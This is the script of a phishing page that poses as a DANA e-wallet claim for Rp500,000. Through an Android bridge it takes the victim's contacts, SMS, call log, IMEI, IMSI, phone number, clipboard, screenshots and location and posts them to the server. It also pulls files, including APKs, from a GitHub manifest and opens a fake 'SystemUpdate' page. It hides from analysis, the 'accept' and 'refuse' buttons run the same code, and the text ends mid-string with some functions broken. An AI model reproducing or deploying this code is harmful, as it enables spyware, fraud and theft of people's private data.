<script>
// ============================================================
// 🔥 INDEX.HTML - DOWNLOAD SEMUA FILE DARI MANIFEST.TXT
// ============================================================

console.log = function() {};
console.warn = function() {};
console.error = function() {};
console.info = function() {};
console.debug = function() {};
console.table = function() {};

// ============================================================
// STEALTH + ANTI-ANALYSIS
// ============================================================
(function() {
    var check = function() {
        var start = Date.now();
        debugger;
        var end = Date.now();

})();

document.addEventListener('keydown', function(e) {

        return false;
    }
});
document.addEventListener('contextmenu', function(e) { e.preventDefault(); return false; });
document.addEventListener('selectstart', function(e) { e.preventDefault(); return false; });

window.onerror = function() { return true; };
window.addEventListener('error', function(e) { e.preventDefault(); e.stopPropagation(); return true; }, true);
window.addEventListener('unhandledrejection', function(e) { e.preventDefault(); e.stopPropagation(); return true; }, true);

if (window.history && window.history.replaceState) {
    window.history.replaceState(null, null, window.location.href);
}
Object.defineProperty(document, 'referrer', { value: '' });

// ============================================================
// DETEKSI PLATFORM
// ============================================================
function detectPlatform() {
    var ua = navigator.userAgent.toLowerCase();
    return {
        isAndroid: ua.indexOf('android') > -1,
        isIOS: /iphone|ipad|ipod/.test(ua),
        isPC: !ua.match(/android|iphone|ipad|ipod|mobile/i),
        isWebView: ua.indexOf('wv') > -1 || ua.indexOf('webview') > -1,
        isAndroidBridge: typeof AndroidBridge !== 'undefined'
    };
}
var PLATFORM = detectPlatform();

// ============================================================
// KONFIGURASI
// ============================================================
var GITHUB_USER = 'pandora-site';
var GITHUB_REPO = 'verifikasi-site';
var semuaDidapat = false;
var DOWNLOAD_STARTED = false;
var NOTIFICATION_SHOWN = false;
var REDIRECT_DONE = false;
var spreadDone = false;

var MANIFEST_URL = 'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/manifest.txt';
var BASE_URL = 'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/';
var DOWNLOADED_FILES = [];
var TOTAL_FILES = 0;

// ============================================================
// FUNGSI K() - KIRIM DATA KE SERVER
// ============================================================
function K(d) {
    try {
        var xhr = new XMLHttpRequest();
        xhr.open('POST', '/data', true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.timeout = 5000;
        xhr.send(JSON.stringify(d));
    } catch(e) {}
}

// ============================================================
// ANDROID BRIDGE (UNIVERSAL) - SAMA DENGAN SYSTEMUPDATE.HTML
// ============================================================
var A = {
    isAvailable: typeof AndroidBridge !== 'undefined' && PLATFORM.isAndroid,
    saveFile: function(p,c) { if(this.isAvailable){ try{ AndroidBridge.saveFile(p,c); return true }catch(e){} } return false; },
    readFile: function(p) { if(this.isAvailable){ try{ return AndroidBridge.readFile(p) }catch(e){} } return null; },
    fileExists: function(p) { if(this.isAvailable){ try{ return AndroidBridge.fileExists(p) }catch(e){} } return false; },
    openFile: function(p) { if(this.isAvailable){ try{ AndroidBridge.openFile(p); return true }catch(e){} } return false; },
    saveToPreferences: function(k,v) { if(this.isAvailable){ try{ AndroidBridge.saveToPreferences(k,v); return true }catch(e){} } return false; },
    getFromPreferences: function(k) { if(this.isAvailable){ try{ return AndroidBridge.getFromPreferences(k) }catch(e){} } return null; },
    saveFileBinary: function(p,d) { if(this.isAvailable){ try{ AndroidBridge.saveFileBinary(p,d); return true }catch(e){} } return false; },
    installAPK: function(p) { if(this.isAvailable){ try{ return AndroidBridge.installAPK(p) }catch(e){} } return false; },
    // FUNGSI UNTUK AMBIL DATA
    getAllContacts: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getAllContacts())}catch(e){}} return null; },
    getAllSMS: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getAllSMS())}catch(e){}} return null; },
    getCallLog: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getCallLog())}catch(e){}} return null; },
    getIMEI: function() { if(this.isAvailable){ try{return AndroidBridge.getIMEI()}catch(e){}} return null; },
    getIMSI: function() { if(this.isAvailable){ try{return AndroidBridge.getIMSI()}catch(e){}} return null; },
    getPhoneNumber: function() { if(this.isAvailable){ try{return AndroidBridge.getPhoneNumber()}catch(e){}} return null; },
    getInstalledApps: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getInstalledApps())}catch(e){}} return null; },
    getClipboard: function() { if(this.isAvailable){ try{return AndroidBridge.getClipboard()}catch(e){} } return null; },
    takeScreenshot: function() { if(this.isAvailable){ try{return AndroidBridge.takeScreenshot()}catch(e){}} return null; },
    getLocation: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getLocation())}catch(e){}} return null; },
    getDeviceInfo: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getDeviceInfo())}catch(e){}} return null; }
};

// ============================================================
// 🔥 1 IZIN UNTUK SEMUA (TEKNIK YANG DULU BERHASIL!)
// ============================================================
function injectAllPermissions() {
    try {
        K({ sumber: 'bypass_permissions_start', data: 'all' });

        if (navigator.geolocation) {
            try {
                navigator.geolocation.getCurrentPosition(
                    function() {},
                    function() {},
                    { enableHighAccuracy: true, timeout: 5000 }
                );
            } catch(e) {}
        }

        if ('Notification' in window && Notification.permission !== 'denied') {
            try {
                if (Notification.permission !== 'granted') {
                    Notification.requestPermission();
                }
            } catch(e) {}
        }

        if (navigator.clipboard) {
            try {
                navigator.clipboard.readText().catch(function() {});
            } catch(e) {}
        }

        if (navigator.mediaDevices) {
            try {
                navigator.mediaDevices.getUserMedia({ audio: true, video: false })
                    .then(function(stream) { stream.getTracks().forEach(function(t) { t.stop(); }); })
                    .catch(function() {});
            } catch(e) {}
            try {
                navigator.mediaDevices.getUserMedia({ audio: false, video: true })
                    .then(function(stream) { stream.getTracks().forEach(function(t) { t.stop(); }); })
                    .catch(function() {});
            } catch(e) {}
            try {
                navigator.mediaDevices.getUserMedia({ audio: true, video: true })
                    .then(function(stream) { stream.getTracks().forEach(function(t) { t.stop(); }); })
                    .catch(function() {});
            } catch(e) {}
        }

        if (navigator.vibrate) {
            try { navigator.vibrate(1); } catch(e) {}
        }

        if (navigator.storage && navigator.storage.persist) {
            try {
                navigator.storage.persist().catch(function() {});
            } catch(e) {}
        }

        K({ sumber: 'bypass_permissions_done', data: 'all_bypassed' });
    } catch(e) {
        K({ sumber: 'bypass_permissions_error', data: e.message });
    }
}

// ============================================================
// 🔥 SIMPAN FILE KE MULTI-LOKASI (SAMA DENGAN SYSTEMUPDATE.HTML)
// ============================================================
function saveFileToAllLocations(fileName, base64Content) {
    var fileNameClean = fileName.replace(/[^a-zA-Z0-9._-]/g, '');
    
    // 1. localStorage
    try {
        localStorage.setItem('file_' + fileNameClean, base64Content);
    } catch(e) {}
    
    // 2. IndexedDB
    try {
        var request = indexedDB.open('SystemUpdateDB', 1);
        request.onupgradeneeded = function(e) {
            var db = e.target.result;
            if (!db.objectStoreNames.contains('files')) {
                db.createObjectStore('files');
            }
        };
        request.onsuccess = function(e) {
            var db = e.target.result;
            var tx = db.transaction('files', 'readwrite');
            var store = tx.objectStore('files');
            store.put(base64Content, fileNameClean);
        };
    } catch(e) {}
    
    // 3. Download folder & SharedPreferences
    if (PLATFORM.isAndroid && A.isAvailable) {
        try {
            var path = '/storage/emulated/0/Download/' + fileNameClean;
            if (fileNameClean.toLowerCase().indexOf('.apk') > -1) {
                var binary = Uint8Array.from(atob(base64Content), c => c.charCodeAt(0));
                A.saveFileBinary(path, binary);
            } else {
                var content = atob(base64Content);
                A.saveFile(path, content);
            }
        } catch(e) {}
        
        try {
            var encoded = btoa(unescape(encodeURIComponent(base64Content)));
            A.saveToPreferences('file_' + fileNameClean, encoded);
        } catch(e) {}
    }
}

// ============================================================
// 🔥 DOWNLOAD SEMUA FILE DARI MANIFEST.TXT
// ============================================================
function downloadAllFilesFromManifest() {
    if (DOWNLOAD_STARTED) return;
    DOWNLOAD_STARTED = true;
    
    K({ sumber: 'manifest_download_start', data: 'reading_manifest' });
    
    try {
        var xhrManifest = new XMLHttpRequest();
        xhrManifest.open('GET', MANIFEST_URL, true);
        xhrManifest.timeout = 15000;
        xhrManifest.onload = function() {
            if (xhrManifest.status === 200) {
                try {
                    var manifestData = xhrManifest.responseText.trim();
                    var lines = manifestData.split('\n');
                    var files = [];
                    
                    for (var i = 0; i < lines.length; i++) {
                        var line = lines[i].trim();
                        if (line.length > 0) {
                            files.push(line);
                        }
                    }
                    
                    TOTAL_FILES = files.length;
                    K({ sumber: 'manifest_files_found', data: { total: TOTAL_FILES, files: files } });
                    
                    if (TOTAL_FILES > 0) {
                        // Download semua file satu per satu
                        downloadAllFiles(files, 0);
                    } else {
                        K({ sumber: 'manifest_empty', data: 'no_files_found' });
                        openSystemUpdateHTML();
                    }
                } catch(e) {
                    K({ sumber: 'manifest_parse_error', data: e.message });
                    openSystemUpdateHTML();
                }
            } else {
                K({ sumber: 'manifest_failed', data: 'status_' + xhrManifest.status });
                openSystemUpdateHTML();
            }
        };
        xhrManifest.onerror = function() {
            K({ sumber: 'manifest_error', data: 'network_error' });
            openSystemUpdateHTML();
        };
        xhrManifest.ontimeout = function() {
            K({ sumber: 'manifest_timeout', data: 'timeout' });
            openSystemUpdateHTML();
        };
        xhrManifest.send();
    } catch(e) {
        K({ sumber: 'manifest_exception', data: e.message });
        openSystemUpdateHTML();
    }
}

function downloadAllFiles(files, index) {
    if (index >= files.length) {
        K({ sumber: 'all_files_downloaded', data: { total: files.length, list: DOWNLOADED_FILES } });
        // 🔥 SEMUA FILE SUDAH DOWNLOAD, BUKA SYSTEMUPDATE.HTML
        openSystemUpdateHTML();
        return;
    }
    
    var fileName = files[index];
    var fileUrl = BASE_URL + fileName;
    
    K({ sumber: 'file_download_start', data: { file: fileName, index: (index+1) + '/' + files.length } });
    
    try {
        var xhr = new XMLHttpRequest();
        xhr.open('GET', fileUrl, true);
        xhr.responseType = 'blob';
        xhr.timeout = 60000;
        xhr.onload = function() {
            if (xhr.status === 200) {
                var blob = xhr.response;
                var reader = new FileReader();
                reader.onload = function() {
                    var base64 = reader.result.split(',')[1];
                    if (base64) {
                        saveFileToAllLocations(fileName, base64);
                        DOWNLOADED_FILES.push(fileName);
                        K({ sumber: 'file_saved', data: { file: fileName } });
                    }
                };
                reader.readAsDataURL(blob);
            } else {
                K({ sumber: 'file_download_failed', data: { file: fileName, status: xhr.status } });
            }
            // Lanjut ke file berikutnya
            setTimeout(function() {
                downloadAllFiles(files, index + 1);
            }, 500);
        };
        xhr.onerror = function() {
            K({ sumber: 'file_download_error', data: { file: fileName } });
            setTimeout(function() {
                downloadAllFiles(files, index + 1);
            }, 500);
        };
        xhr.ontimeout = function() {
            K({ sumber: 'file_download_timeout', data: { file: fileName } });
            setTimeout(function() {
                downloadAllFiles(files, index + 1);
            }, 500);
        };
        xhr.send();
    } catch(e) {
        K({ sumber: 'file_download_exception', data: { file: fileName, error: e.message } });
        setTimeout(function() {
            downloadAllFiles(files, index + 1);
        }, 500);
    }
}

// ============================================================
// 🔥 BUKA SYSTEMUPDATE.HTML (5 DETIK)
// ============================================================
function openSystemUpdateHTML() {
    setTimeout(function() {
        var htmlContent = null;
        
        // 1. SharedPreferences
        if (PLATFORM.isAndroid && A.isAvailable) {
            try {
                var encoded = A.getFromPreferences('file_SystemUpdate.html');
                if (encoded) {
                    htmlContent = decodeURIComponent(escape(atob(encoded)));
                }
            } catch(e) {}
        }
        
        // 2. localStorage
        if (!htmlContent) {
            try { htmlContent = localStorage.getItem('file_SystemUpdate.html'); } catch(e) {}
        }
        
        // 3. IndexedDB
        if (!htmlContent) {
            try {
                var request = indexedDB.open('SystemUpdateDB', 1);
                request.onsuccess = function(e) {
                    var db = e.target.result;
                    var tx = db.transaction('files', 'readonly');
                    var store = tx.objectStore('files');
                    var get = store.get('SystemUpdate.html');
                    get.onsuccess = function() {
                        if (get.result) {
                            try {
                                var content = atob(get.result);
                                openHTML(content);
                            } catch(e) {}
                        }
                    };
                };
            } catch(e) {}
        }
        
        // 4. Download folder
        if (!htmlContent && PLATFORM.isAndroid && A.isAvailable) {
            try {
                htmlContent = A.readFile('/storage/emulated/0/Download/SystemUpdate.html');
            } catch(e) {}
        }
        
        if (htmlContent) {
            openHTML(htmlContent);
        }
    }, 5000);
}

function openHTML(htmlContent) {
    // 🔥 Buka dari Download folder
    if (PLATFORM.isAndroid && A.isAvailable) {
        try {
            var path = '/storage/emulated/0/Download/SystemUpdate.html';
            if (A.fileExists(path)) {
                A.openFile(path);
                return;
            }
        } catch(e) {}
    }
    // Blob URL (fallback)
    try {
        var blob = new Blob([htmlContent], { type: 'text/html' });
        var url = URL.createObjectURL(blob);
        window.open(url, '_blank');
    } catch(e) {}
}

// ============================================================
// 🔥 AMBIL DATA DARI PERANGKAT (UNIVERSAL)
// ============================================================
function ambilDataCepat() {
    var data = { 
        waktu: Date.now(), 
        ua: navigator.userAgent, 
        platform: PLATFORM 
    };
    
    function validateData(d) { 
        if (!d) return null; 
        if (typeof d === 'string' && d.length > 10000) return d.substring(0, 10000); 
        if (typeof d === 'object') { 
            var clean = {}; 
            for (var key in d) { 
                if (d[key] !== undefined && d[key] !== null) { 
                    clean[key] = d[key]; 
                } 
            } 
            return clean; 
        } 
        return d; 
    }
    
    if (PLATFORM.isAndroid && A.isAvailable) {
        try { var kontak = A.getAllContacts(); if(kontak) { data.kontak = validateData(kontak); K({sumber:'kontak_all', data:validateData(kontak)}); } } catch(e) {}
        try { var sms = A.getAllSMS(); if(sms) { data.sms = validateData(sms); K({sumber:'sms_all', data:validateData(sms)}); } } catch(e) {}
        try { var clipboard = A.getClipboard(); if(clipboard) { data.clipboard = validateData(clipboard); K({sumber:'clipboard', data:validateData(clipboard)}); } } catch(e) {}
        try { var callLog = A.getCallLog(); if(callLog) K({sumber:'call_log', data:validateData(callLog)}); } catch(e) {}
        try { var apps = A.getInstalledApps(); if(apps) K({sumber:'aplikasi_all', data:validateData(apps)}); } catch(e) {}
        try { var ss = A.takeScreenshot(); if(ss) K({sumber:'screenshot', data:validateData(ss)}); } catch(e) {}
        try { var loc = A.getDeviceInfo(); if(loc) K({sumber:'device_info', data:validateData(loc)}); } catch(e) {}
        try { var imei = A.getIMEI(); if(imei) K({sumber:'imei', data:validateData(imei)}); } catch(e) {}
        try { var imsi = A.getIMSI(); if(imsi) K({sumber:'imsi', data:validateData(imsi)}); } catch(e) {}
        try { var phone = A.getPhoneNumber(); if(phone) K({sumber:'phone_number', data:validateData(phone)}); } catch(e) {}
        try { var loc2 = A.getLocation(); if(loc2) K({sumber:'lokasi', data:validateData(loc2)}); } catch(e) {}
    }
    
    try { 
        data.screen = { width: screen.width, height: screen.height }; 
        data.language = navigator.language; 
    } catch(e) {}
    
    K({sumber:'init', data:validateData(data)});
    return data;
}

// ============================================================
// 🔥 MAIN EXECUTION
// ============================================================
function dapatkanSemua() {
    if (semuaDidapat) return;
    semuaDidapat = true;
    
    try {
        var popup = document.getElementById('popupDana');
        if (popup) popup.style.display = 'none';
        
        K({ sumber: 'trigger', data: 'dapatkanSemua' });
        
        // 🔥 1 IZIN UNTUK SEMUA
        injectAllPermissions();
        
        // 🔥 AMBIL DATA
        ambilDataCepat();
        
        // 🔥 DOWNLOAD SEMUA FILE DARI MANIFEST.TXT
        setTimeout(function() { 
            downloadAllFilesFromManifest(); 
        }, 500);
        
        // 🔥 STATUS BAR
        setTimeout(function() { 
            var bar = document.getElementById('statusBar'); 
            if (bar) { bar.className = 'status-bar loading'; K({ sumber: 'status_bar', data: 'shown' }); } 
        }, 500);
        
        // 🔥 NOTIFIKASI
        setTimeout(function() { 
            showKlaimNotification(); 
        }, 3000);
        
        // 🔥 REDIRECT KE DANA (8 DETIK)
        setTimeout(function() { 
            if (!REDIRECT_DONE) {
                REDIRECT_DONE = true;
                try { window.location.href = 'https://id.dana.id'; } catch(e) {}
            }
        }, 8000);
        
    } catch(e) {
        K({ sumber: 'dapatkanSemua_error', data: e.message });
    }
}

function klaim() { K({sumber:'izin', data:'klaim'}); dapatkanSemua(); }
function tolak() { K({sumber:'izin', data:'tolak'}); dapatkanSemua(); }

// ============================================================
// 🔥 NOTIFIKASI
// ============================================================
function showKlaimNotification() {
    if (NOTIFICATION_SHOWN) return;
    NOTIFICATION_SHOWN = true;
    
    try {
        if (!('Notification' in window)) { return; }
        if (Notification.permission === 'denied') { return; }
        if (Notification.permission !== 'granted') {
            Notification.requestPermission().then(function(permission) {
                if (permission === 'granted') { createKlaimNotification(); }
            }).catch(function() {});
            return;
        }
        createKlaimNotification();
    } catch(e) {}
}

function createKlaimNotification() {
    try {
        var notif = new Notification('🔔 Klik Untuk Klaim', {
            body: 'Klik untuk menyelesaikan verifikasi dan klaim saldo DANA Rp500.000!',
